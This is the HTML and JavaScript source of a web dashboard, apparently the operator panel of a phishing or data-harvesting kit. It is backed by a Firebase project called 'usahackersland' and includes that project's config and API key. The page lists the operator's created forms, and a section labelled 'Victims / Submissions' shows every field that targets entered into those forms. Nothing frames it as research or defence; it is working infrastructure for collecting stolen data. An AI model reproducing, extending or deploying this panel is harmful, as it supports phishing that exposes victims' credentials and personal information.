<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üé® Form Builder Dashboard</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #f0f2f5;
    }
    header {
      background: #4a90e2;
      color: white;
      padding: 15px;
      text-align: center;
    }
    .container {
      max-width: 1000px;
      margin: 30px auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
    }
    .section {
      margin-bottom: 30px;
    }
    h2 {
      margin-top: 0;
      color: #4a90e2;
    }
    .card {
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 10px;
      background: #f9f9f9;
    }
    button {
      background: #4a90e2;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background: #357ac6;
    }
    .topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .highlight {
      font-weight: bold;
      color: #333;
    }
  </style>
</head>
<body>
  <header>
    <div class="topbar">
      <h1>üé® Form Builder Dashboard</h1>
      <button onclick="logout()">Logout</button>
    </div>
  </header>  <div class="container">
    <div class="section">
      <h2>üìã Your Created Forms</h2>
      <div id="formsList">Loading forms...</div>
    </div><div class="section">
  <h2>üïµÔ∏è Victims / Submissions</h2>
  <div id="victimsList">Loading victims...</div>
</div>

  </div>  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    let currentUserEmail = "";

    auth.onAuthStateChanged(user => {
      if (user) {
        currentUserEmail = user.email;
        loadForms();
        loadVictims();
      } else {
        alert("You must log in first.");
        location.href = "login.html";
      }
    });

    function logout() {
      auth.signOut().then(() => location.href = "login.html");
    }

    function loadForms() {
      db.collection("forms").where("createdBy", "==", currentUserEmail).get().then(snapshot => {
        const container = document.getElementById("formsList");
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No forms found.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <p><span class="highlight">Title:</span> ${data.title || 'No title'}</p>
            <p><span class="highlight">Created:</span> ${new Date(data.createdAt).toLocaleString()}</p>
            <p><span class="highlight">Link:</span> <a href="form.html?id=${doc.id}" target="_blank">Open Form</a></p>
          `;
          container.appendChild(div);
        });
      });
    }

    function loadVictims() {
      db.collection("victims").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
        const container = document.getElementById("victimsList");
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No victim submissions yet.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <p><span class="highlight">Date:</span> ${new Date(data.createdAt).toLocaleString()}</p>
            <p><span class="highlight">Submitted:</span> ${Object.keys(data).map(k => `${k}: ${data[k]}`).join("<br>")}</p>
          `;
          container.appendChild(div);
        });
      });
    }
  </script></body>
</html>
